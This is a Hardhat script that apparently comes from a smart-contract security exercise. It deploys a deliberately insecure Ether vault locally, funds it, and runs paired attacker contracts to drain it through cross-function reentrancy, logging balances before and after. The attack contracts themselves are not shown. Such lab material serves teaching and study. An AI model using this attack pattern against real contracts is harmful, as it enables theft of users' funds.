import { ethers } from "hardhat";

// npx hardhat run scripts/Vulnerability/FailedRandom.ts
async function attack() {
    const [deployer, acc1] = await ethers.getSigners();

    const ethValue = ethers.utils.parseEther("1");

    const InsecureEtherVaultFatctory = await ethers.getContractFactory("InsecureEtherVault");
    const InsecureEtherVault = await InsecureEtherVaultFatctory.deploy();
    await InsecureEtherVault.deployed();
    console.log(`deployed InsecureEtherVault to ${InsecureEtherVault.address}`);

    const AttackFatctory = await ethers.getContractFactory("AttackCrossFunc");
    const Attack1 = await AttackFatctory.deploy(InsecureEtherVault.address);
    await Attack1.deployed();
    console.log(`deployed Attack to ${Attack1.address}`);
    const Attack2 = await AttackFatctory.deploy(InsecureEtherVault.address);
    await Attack2.deployed();
    console.log(`deployed Attack to ${Attack2.address}`);
    await Attack1.setAttackPeer(Attack2.address)
    await Attack2.setAttackPeer(Attack1.address)

    const AttackWrapperFatctory = await ethers.getContractFactory("AttackWrapper");
    const AttackWrapper = await AttackWrapperFatctory.deploy(Attack1.address, Attack2.address);
    await AttackWrapper.deployed();

    await InsecureEtherVault.connect(acc1).deposit({value:ethers.utils.parseEther("12")})

    let InsecureEtherVault_balance = await ethers.provider.getBalance(InsecureEtherVault.address);
    console.log("InsecureEtherVault_balance:", InsecureEtherVault_balance.toString())

    await AttackWrapper.attack(6,{value:ethValue})

    // await Attack1.attackInit({value:ethValue})
    // console.log("Attack1.attackInit finish")
    // const attack2_balance = await InsecureEtherVault.getUserBalance(Attack2.address)
    // console.log("attack2_balance:", attack2_balance.toString())
    // console.log("1.0 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.0 Attack1.attackNext")
    // await Attack1.attackNext()
    // console.log("1.1 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.2 Attack1.attackNext")
    // await Attack1.attackNext()
    // console.log("1.3 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.3 Attack1.attackNext")
    // await Attack1.attackNext()
    // console.log("1.4 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.4 Attack1.attackNext")
    // await Attack1.attackNext()
    // console.log("1.5 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.5 Attack1.attackNext")
    // await Attack1.attackNext()
    // console.log("1.6 Attack2.attackNext")
    // await Attack2.attackNext()
    // console.log("2.6 Attack1.attackNext")
    // await Attack1.attackNext()

    console.log("balacne:", (await Attack1.getBalance()).toString())
    console.log("balacne:",(await Attack2.getBalance()).toString())
    InsecureEtherVault_balance = await ethers.provider.getBalance(InsecureEtherVault.address);
    console.log("InsecureEtherVault_balance:", InsecureEtherVault_balance.toString())
}



async function main() {
    await attack();
    //await attack_failed();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
